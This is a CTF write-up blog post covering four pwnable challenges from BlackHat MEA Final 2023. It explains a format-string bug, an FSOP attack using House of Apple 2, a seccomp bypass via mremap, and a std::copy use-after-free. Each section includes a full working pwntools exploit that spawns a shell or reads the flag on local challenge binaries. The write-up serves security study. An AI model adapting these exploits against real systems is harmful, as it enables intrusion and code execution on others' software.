---
layout: post
title: "BlackHat MEA CTF Final 2023 - Pwnable Write up"
date: 2023-12-29 20:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux, OOB, tcache, FSB, FSOP, BOF, seccomp, UAF, shellcoding]
media_subpath: /assets/img/20231229_blackhat_mea-write-up
image: 1.png
---

I solved some of challs which I got from [nobodyisnobody github](https://github.com/nobodyisnobody/write-ups/tree/main/Blackhat.MEA.CTF.Finals.2023/pwn).

And the challs are nice, so I solved them.

`House of Minho` chall was awesome too, but I'll introduce it in another post.

- [https://ctftime.org/event/2113/](https://ctftime.org/event/2113/)

## **1. fortune**

**[0x01] Summary**

- OOB Read FSB Challenge

[fortune.zip](https://github.com/brwook/binary/raw/main/2023-Blackhat-MEA-Final/fortune.zip)

**[0x02] Solution**

The zip file has a C file.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char custom_fortune[100] = "Embrace the bugs, for in their code lies the beauty of endless possibilities.\n - ChatGPT (GPT-3.5)\n";

static const char *fortunes[] = {
  "Vulnerability sounds like faith and looks like courage.\n - Brene Brown\n",
  "Turn your wounds into wisdom.\n - Oraph Winfrey\n",
  "I never dreamed about success.\nI worked for it.\n - Estee Lauder\n",
  "You are not what you've done.\nYou are what you keep doing.\n - Jack Butcher\n",
  custom_fortune
};

int main() {
  int choice;

  puts("1. Get a fortune cookie" "\n"
       "2. Set a custom message" "\n"
       "x. Exit");

  while (1) {
    printf("> ");
    if (scanf("%d%*c", &choice) != 1)
      exit(1);

    switch (choice) {
      case 1: {
        printf("Which fortune cookie? [0-4]: ");
        if (scanf("%d%*c", &choice) != 1)
          exit(1);
        if (choice > 4) {
          puts("Invalid choice.");
          break;
        }
        putchar('\n');
        printf(fortunes[choice]);
        putchar('\n');
        break;
      }

      case 2: {
        printf("Your message: ");
        if (scanf("%99[^\n]s", custom_fortune) != 1)
          exit(1);
        custom_fortune[strcspn(custom_fortune, "%")] = '\0';
        break;
      }

      default:
        puts("Goodbye.");
        exit(0);
    }
  }
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  alarm(60);
}
```

There is a FSB trigger code(`printf(fortunes[choice])`). Cause `choice` integer value can be nagative, so we can trigger FSB by writing address on `custom_fortune` global variable.

![2.png](2.png)

To leak the pie and libc bases, we can use binary addresses(`__dso_handle`, `plt.got`).

And we can modify `custom_fortune` variable. When we write the variable, it has a simple preventing FSB code. The function can write NULL byte, so we can exploit FSB vulnerability. After that, it is just simple FSB challenge.

The exploit code is as follows:

```python
from pwn import *

def FSB(idx):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"[0-4]: ", str(idx).encode())
    p.recvline()

def setMsg(msg):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b": ", msg)

def setPayload(msg):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b": ", p64(addr) + msg)

def makeAddress_(value, off, lever=False):
    payload = b''
    payload += f"%{(stack - 0xf8 + off) & 0xFFFF}c%{0xd}$hn".encode()
    setPayload(payload)
    FSB(-0x80 // 8)

    payload = b''
    if value != 0:
        payload += f"%{value}c%{0x2b}".encode()
    if lever:
        payload += b'$n'
    else:
        payload += b'$hn'

    setPayload(payload)
    FSB(-0x80 // 8)

def makeAddress(address, offset):
    low = (address >> 0) & 0xFFFF
    mid = (address >> 16) & 0xFFFF
    high = address >> 32
    makeAddress_(low, 0 + offset)
    makeAddress_(mid, 2 + offset)
    makeAddress_(high, 4 + offset, True)

context(arch='amd64', os='linux')
if args.REMOTE:
    p = remote('localhost', 5000)
    libc = ELF('./libc.so.6', False)
else:
    p = process('./fortune', aslr=1)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)

FSB(-0x98 // 8)
pie = u64(p.recv(6).ljust(8, b'\x00')) - 0x4008
puts_got = pie + 0x3fa0
addr = pie + 0x4028
log.success(f"PIE base @ {hex(pie)}")

setMsg(p64(puts_got))
FSB(-0x80 // 8)
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success(f"libc base @ {hex(libc.address)}")

setMsg(p64(libc.symbols['environ']))
FSB(-0x80 // 8)
stack = u64(p.recv(6).ljust(8, b'\x00')) 
log.success(f"stack base @ {hex(stack)}")

makeAddress(stack - 0x220, 0)
makeAddress(stack - 0x220 + 2, 8)
low = libc.symbols['gets'] & 0xFFFF
high = (libc.symbols['gets'] >> 16) & 0xFFFF
if high > low:
    high -= low
else:
    high = 0x10000 - (high - low)
payload = f"%{low}c%{0xe}$hn".encode()
payload += f"%{high}c%{0xf}$hn".encode()
setPayload(payload)
FSB(-0x80 // 8)

rop = ROP([libc])
rop.call('system', [next(libc.search(b'/bin/sh'))])
pause()
p.sendline(b'A'*0x2120 + rop.chain())
p.sendline(b'cat /flag*')

p.interactive()
```

## **2. devpro**

**[0x01] Summary**

- Heap BOF through Devices(`/dev/urandom`, `/dev/null`, `/dev/zero`) Read/Write
- leak with `/dev/null`, make arbitrary bytes BOF with `/dev/zero`
- do FSOP (House of Apple 2)

[devpro.zip](https://github.com/brwook/binary/raw/main/2023-Blackhat-MEA-Final/devpro.zip)

**[0x02] Solution**

There are three devices(`/dev/urandom`, `/dev/null`, `/dev/zero`). we can allocate any-size heap chunk and open/close/read/write to those device using the heap chunk as buffer.

```c
void alloc_buffer() {
  g_size = getint("Size: ");
  if (g_size > 0x400) {
    puts("[-] Size too big");
    return;
  }

  if (g_buf)
    free(g_buf);
  g_buf = (unsigned char*)malloc(g_size);
  memset(g_buf, 0, g_size);
}
```

We can allocate any size buffer and it is initialized with zero. Also, we can set any-size `g_size` can be larger size than 0x400.

```c
void read_device() {
  if (!g_dev) {
    puts("[-] No device opened");
    return;
  } else if (!g_buf) {
    puts("[-] No buffer allocated");
    return;
  }

  fread(g_buf, 1, g_size, g_dev);
  for (size_t i = 0; i < g_size; i++)
    printf("%02x ", g_buf[i]);
  putchar('\n');
  puts("[+] OK");
}
```

Using it with `/dev/null` device, we can leak the whole FILE structure. It is possible from how `/dev/null` always return EOF. It leads to heap & glibc leak.

Furthermore, we can make heap bof. But written the bytes are limited with random bytes(`/dev/urandom`) or null bytes(`/dev/zero`).

We can overwrite any FILE structure member and if we set target as LSB of `FILE->_IO_write_ptr`, something special is found. After overwrite LSB of `_IO_write_ptr`, next step is calling `fwrite` in `write_device` function. below is the code of `fwrite`.

```c
size_t
_IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)
{
  size_t request = size * count;
  size_t written = 0;
  CHECK_FILE (fp, 0);
  if (request == 0)
    return 0;
  _IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request);
  _IO_release_lock (fp);
  /* We have written all of the input in case the return value indicates
     this or EOF is returned.  The latter is a special case where we
     simply did not manage to flush the buffer.  But the data is in the
     buffer and therefore written as far as fwrite is concerned.  */
  if (written == request || written == EOF)
    return count;
  else
    return written / size;
}
```

```c
size_t
_IO_new_file_xsputn (FILE *f, const void *data, size_t n)
{
  const char *s = (const char *) data;
  size_t to_do = n;
  int must_flush = 0;
  size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
    ...
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
	count = to_do;
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
      s += count;
      to_do -= count;
    }
  ...
  return n - to_do;
}
libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
```

We can write any value from `_IO_write_ptr` to `_IO_write_end`. And if we set the LSB of `_IO_write_ptr` as zero, we can overwrite `FILE->_fileno` with 0. Then we can read from 0 file descriptor (stdin) and write any value! Lastly, overwrite FILE structure and do FSOP.

```python
from pwn import *
choice = lambda x:p.sendlineafter(b"> ", str(x).encode())
def openDev(idx):
    choice(1)
    choice(idx)

def allocBuf(size):
    choice(2)
    p.sendlineafter(b"Size: ", str(size).encode())

def readDev():
    choice(3)

def writeDev(data):
    choice(4)
    d = ''
    for i in data:
        d += hex(i)[2:] + ' '
    p.sendafter(b"Data: ", d.encode())

def closeDev():
    choice(5)

p = process('./devpro', aslr=1)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)

# 1. heap & glibc leak through OOB Read (/dev/null)
allocBuf(0x400)
openDev(2)
allocBuf(0x500)
readDev()
s = bytes.fromhex(p.recvline().replace(b' ', b'').decode())
heap = u64(s[0x418:0x420]) - 0x733
log.success(f"heap base @ {hex(heap)}") 
libc.address = u64(s[0x478:0x480]) - libc.symbols['_IO_2_1_stderr_']
log.success(f"libc base @ {hex(libc.address)}")
closeDev()

# 2. overwrite LSB of FILE->_IO_write_ptr with 0
openDev(3)
allocBuf(0x410 + 0x29)
readDev()

# 3. overwrite FILE->_fileno with 0
allocBuf(0x28)
writeDev(b'\x00'*0x18 + p64(libc.sym._IO_2_1_stderr_) + p64(0))

# 4. FSOP (House of Apple 2)
allocBuf(0x400)
payload = b'\x00'*0x408 + p64(0x1e1) + b' sh'.ljust(8, b'\x00')
payload += p64(0) * 12
payload += p64(libc.sym._IO_2_1_stderr_) + p64(3) + p64(0x0) * 2
payload += p64(heap + 0x790) + b'\xff'*8 + p64(0) + p64(heap + 0x6b0 - 0x10)
payload += p64(0) * 3 + b'\xff'*4 + b'\x00'*0x4 + p64(libc.sym.system) + p64(heap + 0x710) + p64(libc.address + 0x216000 - 0x20)
allocBuf(len(payload))
readDev()
p.send(payload)
writeDev(b'A')
p.interactive()
```

## **3. babysbx**

**[0x01] Summary**

- execve syscall is restricted by binary address
- binary address leak : brk → nanosleep bruteforce
- page reallocation : mremap

[babysbx.zip](https://github.com/brwook/binary/raw/main/2023-Blackhat-MEA-Final/babysbx.zip)

**[0x02] Solution**

There is a seccomp mitigation in this binary, so I checked it.

```bash
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x28 0xc000003e  if (A != ARCH_X86_64) goto 0042
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x25 0xffffffff  if (A != 0xffffffff) goto 0042
 0005: 0x15 0x24 0x00 0x00000002  if (A == open) goto 0042
 0006: 0x15 0x23 0x00 0x00000009  if (A == mmap) goto 0042
 0007: 0x15 0x22 0x00 0x0000000a  if (A == mprotect) goto 0042
 0008: 0x15 0x21 0x00 0x0000000b  if (A == munmap) goto 0042
 0009: 0x15 0x20 0x00 0x00000011  if (A == pread64) goto 0042
 0010: 0x15 0x1f 0x00 0x00000013  if (A == readv) goto 0042
 0011: 0x15 0x1e 0x00 0x00000038  if (A == clone) goto 0042
 0012: 0x15 0x1d 0x00 0x00000039  if (A == fork) goto 0042
 0013: 0x15 0x1c 0x00 0x0000003a  if (A == vfork) goto 0042
 0014: 0x15 0x1b 0x00 0x0000003e  if (A == kill) goto 0042
 0015: 0x15 0x1a 0x00 0x00000055  if (A == creat) goto 0042
 0016: 0x15 0x19 0x00 0x00000065  if (A == ptrace) goto 0042
 0017: 0x15 0x18 0x00 0x00000101  if (A == openat) goto 0042
 0018: 0x15 0x17 0x00 0x00000127  if (A == preadv) goto 0042
 0019: 0x15 0x16 0x00 0x00000136  if (A == process_vm_readv) goto 0042
 0020: 0x15 0x15 0x00 0x00000137  if (A == process_vm_writev) goto 0042
 0021: 0x15 0x14 0x00 0x00000142  if (A == execveat) goto 0042
 0022: 0x15 0x13 0x00 0x00000147  if (A == preadv2) goto 0042
 0023: 0x15 0x12 0x00 0x000001b3  if (A == 0x1b3) goto 0042
 0024: 0x15 0x11 0x00 0x000001b5  if (A == 0x1b5) goto 0042
 0025: 0x15 0x00 0x04 0x0000003b  if (A != execve) goto 0030
 0026: 0x20 0x00 0x00 0x00000014  A = filename >> 32 # execve(filename, argv, envp)
 0027: 0x15 0x00 0x0e 0x00005653  if (A != 0x5653) goto 0042
 0028: 0x20 0x00 0x00 0x00000010  A = filename # execve(filename, argv, envp)
 0029: 0x15 0x0b 0x0c 0xd699b050  if (A == 0xd699b050) goto 0041 else goto 0042
 0030: 0x15 0x00 0x0a 0x00000000  if (A != read) goto 0041
 0031: 0x20 0x00 0x00 0x00000024  A = count >> 32 # read(fd, buf, count)
 0032: 0x15 0x00 0x09 0x00000000  if (A != 0x0) goto 0042
 0033: 0x20 0x00 0x00 0x00000020  A = count # read(fd, buf, count)
 0034: 0x15 0x00 0x07 0x00000001  if (A != 0x1) goto 0042
 0035: 0x20 0x00 0x00 0x0000001c  A = buf >> 32 # read(fd, buf, count)
 0036: 0x25 0x05 0x00 0x00000000  if (A > 0x0) goto 0042
 0037: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0042
 0038: 0x20 0x00 0x00 0x00000018  A = buf # read(fd, buf, count)
 0039: 0x35 0x00 0x02 0x0c0de000  if (A < 0xc0de000) goto 0042
 0040: 0x35 0x01 0x00 0x0c0df000  if (A >= 0xc0df000) goto 0042
 0041: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0042: 0x06 0x00 0x00 0x00000000  return KILL
```

A unusual condition is here.

```bash
0x5653d699b050 == filename
```

You can watch more details about this.

```nasm
loc_1639:
	mov     [rbp+var_80], 0
	mov     [rbp+var_78], 0
	mov     [rbp+var_70], 0
	mov     dword ptr [rbp+var_80+4], 1
	lea     rax, ALLOWED_EXE ; "/bin/id"
	mov     [rbp+var_78], rax
	mov     rax, [rbp+var_88]
	sub     rsp, 8
	push    [rbp+var_70]
	push    [rbp+var_78]
	push    [rbp+var_80]
	mov     ecx, 1
	mov     edx, 59
	mov     esi, 0
	mov     rdi, rax
	mov     eax, 0
	call    _seccomp_rule_add

.rodata:0000000000002050 ALLOWED_EXE     db '/bin/id',0          ; DATA XREF: install_sandbox+3B3↑o
```

when we use execve syscall, we must have a first argument with `ALLOWED_EXE` variable. But, it is located at `.rodata` area, so we can’t overwrite it. To do it, we have to allocate the memory mapped address or change privilege of the readonly data page. 

As you know, several allocation and chaning privilege syscalls(`mmap`, `munmap`, `mprotect`) are banned. So I searched every syscall which is relevant with it and found [mremap syscall](https://man7.org/linux/man-pages/man2/mremap.2.html). It reallocates a current page with new size and flags, so we can replace `ALLOWED_EXE` address with another page.

To use this syscall we have to know where the binary is mapped. First of all, when we call [brk syscall](https://man7.org/linux/man-pages/man2/brk.2.html), it returns current program break. Through this, we can leak the heap address. Next, we can bruteforce the proper page with [nanosleep syscall](https://man7.org/linux/man-pages/man2/nanosleep.2.html). Because when nanosleep has invalid address, it returns -1.

The exploit code is as follows:

```python
from pwn import *

context(arch='amd64', os='linux')
shell = '''
    // 1. get heap address (brk)
    mov rax, 12
    mov rdi, 0
    syscall 

    sub rax, 0x22000
    sub rax, 0x400
    mov rdi, rax
loop:
    // 2. find binary address (nanosleep bruteforce)
    sub rdi, 0x1000
    xor eax, eax
    mov al, 35
    syscall
    cmp al, 0
    jne loop

    // 3. mremap(ro_data, 0x1000, 0x2000, MREMAP_FIXED | MREMAP_MAYMOVE, 0xc0df000);
    sub rdi, 0x2c00
    mov rsi, 0x1000
    mov rdx, 0x2000
    mov r10, 3
    mov r8, 0xc0df000
    mov rax, 25
    syscall

    // 4. push command in bss
    add rdi, 0x2060
    mov rsp, rdi
    mov rdi, 0x6761
    push rdi
    mov rdi, 0x6c66646165722f2e
    push rdi
    mov rdi, rsp
    sub rdi, 0x50

    // 5. mremap(bss, 0x1000, 0x1000, MREMAP_FIXED | MREMAP_MAYMOVE, ro_data)
    mov rsi, 0x1000
    mov rdx, 0x1000
    mov r10, 3
    mov r8, rdi
    sub r8, 0x2000
    mov rax, 25
    syscall

    // 6. execve(ALLOWED_EXE, 0, 0);
    sub rdi, 0x2000
    add rdi, 0x50
    mov rsi, 0
    mov rdx, 0
    mov rax, 59
    syscall

'''
code = asm(shell)
p = process('./babysbx', aslr=1)
p.sendlineafter(b": ", (code).ljust(0xFD7, b'\x00'))

p.interactive()
```

## **4. vec**

**[0x01] Summary**

- when std::copy receives `last` argument which is `first` argument, it can be led to UAF.

[vec.zip](https://github.com/brwook/binary/raw/main/2023-Blackhat-MEA-Final/vec.zip)

**[0x02] Solution**

The source code is given.

```cpp
#include <stdexcept>
#include <iostream>
#include <vector>

int main() {
  std::vector<size_t> vec;

  std::setbuf(stdin, nullptr);
  std::setbuf(stdout, nullptr);
  std::setbuf(stderr, nullptr);
  std::cout << "1. set" << std::endl
            << "2. get" << std::endl
            << "3. copy" << std::endl
            << "4. clear" << std::endl;

  while (std::cin.good()) {
    size_t choice;
    std::cout << ">> ";
    std::cin >> choice;

    switch (choice) {
      case 1: {
        /* set */
        size_t index, value;
        std::cout << "index: ";
        std::cin >> index;
        if (index > vec.size())
          throw std::out_of_range("vector index out of range");

        std::cout << "value: ";
        std::cin >> value;
        if (index < vec.size())
          vec[index] = value;
        else if (index == vec.size())
          vec.emplace_back(value);
        break;
      }

      case 2: {
        /* get */
        size_t index, value;
        std::cout << "index: ";
        std::cin >> index;
        if (index >= vec.size())
          throw std::out_of_range("vector index out of range");

        std::cout << "vec[" << index << "] = " << vec[index] << std::endl;
        break;
      }

      case 3: {
        /* copy */
        size_t src, dest, count;
        std::cout << "from: ";
        std::cin >> src;
        std::cout << "to: ";
        std::cin >> dest;
        std::cout << "count: ";
        std::cin >> count;

        if (src > vec.size() || dest > vec.size())
          throw std::out_of_range("vector index out of range");
        if (src + count > vec.size() || dest + count > vec.size())
          throw std::out_of_range("count too big");
        std::copy(vec.begin() + src,
                  vec.begin() + src + count,
                  vec.begin() + dest);
        break;
      }

      case 4:
        /* clear */
        vec.clear();
        vec.shrink_to_fit();
        break;

      default:
        return 0;
    }
  }

  return 1;
}
```

There is a OOB Write vulnerability in copy primitive. 

```cpp
        /* copy */
        size_t src, dest, count;
        std::cout << "from: ";
        std::cin >> src;
        std::cout << "to: ";
        std::cin >> dest;
        std::cout << "count: ";
        std::cin >> count;

        if (src > vec.size() || dest > vec.size())
          throw std::out_of_range("vector index out of range");
        if (src + count > vec.size() || dest + count > vec.size())
          throw std::out_of_range("count too big");
        std::copy(vec.begin() + src,
                  vec.begin() + src + count,
                  vec.begin() + dest);
```

Since there is no direct condition check of the `count` variable, it can be negative. Therefore, the second argument of `std::copy` can be lower than the first argument. The prototype and implementation of `std::copy` is as below:

```cpp
template <class InputIt, class OutputIt>
OutputIt copy(InputIt first, InputIt last, OutputIt d_first);

__int64 __fastcall std::copy<__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>,__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>>(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rax

  v3 = std::__miter_base<__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>>(a2);
  v4 = std::__miter_base<__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>>(a1);
  return std::__copy_move_a<false,__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>,__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>>(
           v4,
           v3,
           a3);
}

__int64 __fastcall std::__copy_move_a<false,__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>,__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>>(__int64 a1, __int64 a2, __int64 a3)
{
  char *v3; // r12
  __int64 v4; // rbx
  const void *v5; // rax
  char *v6; // rax

  v3 = (char *)std::__niter_base<unsigned long *,std::vector<unsigned long>>(a3);
  v4 = std::__niter_base<unsigned long *,std::vector<unsigned long>>(a2);
  v5 = (const void *)std::__niter_base<unsigned long *,std::vector<unsigned long>>(a1);
  v6 = std::__copy_move_a1<false,unsigned long *,unsigned long *>(v5, v4, v3);
  return std::__niter_wrap<__gnu_cxx::__normal_iterator<unsigned long *,std::vector<unsigned long>>,unsigned long *>(
           a3,
           v6);
}

...

char *__fastcall std::__copy_move<false,true,std::random_access_iterator_tag>::__copy_m<unsigned long>(const void *a1, __int64 a2, char *a3)
{
  __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = (a2 - (__int64)a1) >> 3;
  if ( v5 )
    memmove(a3, a1, 8 * v5);
  return &a3[8 * v5];
}
```

If we enter the `count` as negative value, `last` is lower than `first` and it makes third argument huge. This is a context when I enter the src(1), dest(3), count(-1).

```c
Breakpoint 9, 0x0000555555556c6b in unsigned long* std::__copy_move<false, true, std::random_access_iterator_tag>::__copy_m<unsigned long>(unsigned long const*, unsigned long const*, unsigned long*) ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
...
*RDX  0xfffffffffffffff8
*RDI  0x55555556e018 ◂— 0x3
*RSI  0x55555556e008 ◂— 0x1
...
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────
 ► 0x555555556c6b <unsigned long* std::__copy_move<false, true, std::random_access_iterator_tag>::__copy_m<unsigned long>(unsigned long const*, unsigned long const*, unsigned long*)+73>                                                                                         call   memmove@plt                <memmove@plt>
        dest: 0x55555556e018 ◂— 0x3
        src: 0x55555556e008 ◂— 0x1
        n: 0xfffffffffffffff8
```

Since the latest memmove is applied with optimization, I can’t explain the details in it. But, after calling this function, our vector get copied from the freed chunk. Using this, we can leak heap & libc base and try tcacue dup through “a little” effort. Cause we have Read/Write primitive in our vector, it is possible.

Here is a exploit for it.

```python
from pwn import *
choice = lambda x:p.sendline(str(x).encode())
def Set(idx, value):
    choice(1)
    p.sendline(str(idx).encode())
    p.sendline(str(value).encode())

def Get(idx):
    choice(2)
    p.sendline(str(idx).encode())
    p.recvuntil(b" = ")

def Copy(src, dst, cnt):
    choice(3)
    p.sendline(str(src).encode())
    p.sendline(str(dst).encode())
    p.sendline(str(cnt).encode())

def Clear():
    choice(4)

def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(p, addr):
    return p ^ (addr>>12)

def Upper(val1, val2):
    Set(0, val1)
    Set(1, val2)
    Copy(4, 2, -1)

context(arch='amd64', os='linux')
if args.REMOTE:
    p = remote('localhost', 5000)
    libc = ELF("./libc.so.6", False)
else:
    p = process('./vec', aslr=1)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)

# 1. heap leak
for i in range(0x20):
    Set(i, i)

for _ in range(10):
    Copy(1, 3, -1)

Get(0)
leak = int(p.recvline())
heap = (leak << 12) - 0x11000
log.success(f"heap base @ {hex(heap)}")
Upper(0, 0x111)
Set(0, 0)
Set(0, 1)
for i in range(0x20, 0x160):
    Set(i, i)

Clear()

# 2. libc leak
for i in range(0x10):
    Set(i, 0xFBAD0000 + i)

Set(8, 0x0)
Set(9, 0x91)

for i in range(0x10, 0x80):
    Set(i, i)

Copy(0x80, 0x70, -1)
Get(0x72)
libc.address = int(p.recvline(), 10) - 96 - 0x100 - 224 - libc.symbols['_IO_2_1_stdin_']
log.success(f"libc base @ {hex(libc.address)}")
Clear()

# 3. tcache dup into 0x11c10 chunk and free it
for i in range(8):
    Set(i, 0xDEAD0000 + i)

fd1 = obfuscate(0, heap + 0x11eb0)
fd2 = obfuscate(heap + 0x2a0, heap + 0x11ed0)
fd3 = obfuscate(0, heap + 0x11ef0)
Upper(0, 0x21)
Upper(fd1, 0)
Upper(0, 0x21)
Upper(fd2, 0)
Upper(0, 0x31)
Upper(fd3, 0)
Upper(0, 0)
Upper(0, 0x51)
Clear()

Set(0, 0)
Set(1, 0)
Clear()

# 4. overwrite tcache_perthread_struct and stack leak
for i in range(0x81):
    Set(i, i)
Upper(0, 0x21)
Upper(0, libc.symbols['environ'] - 0x210)
Upper(0, 0x21)
Upper(obfuscate(heap + 0x11eb0, heap + 0x2a0),0) 
Upper(0, 0x811)
Clear()

for i in range(0x41):
    Set(i, 0)

Copy(0x40, 0x20, -1)
Get(0x22)
stack = int(p.recvline(), 10)
log.success(f"stack @ {hex(stack)}")
Upper(0, 0x411)
for i in range(0x81):
    Set(i, 0)

Upper(0, 0x21)
Upper(0, stack - 0xa8)
Upper(0, 0x21)
Upper(obfuscate(0, heap + 0x2a0),0) 
Upper(0, 0x811)
Clear()

# 5. allocate into stack and ROP
for i in range(0x41):
    Set(i, i)

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi', 'pop rbp', 'ret'])[0]
Upper(0, pop_rdi)
Upper(next(libc.search(b'/bin/sh')), 0)
Upper(libc.symbols['system'], 0)
for i in range(4):
    Upper(0, 0x4141414141414141)

Upper(0x0, 0x411)
choice(5)
p.sendline(b'cat /flag*')

p.interactive()
```

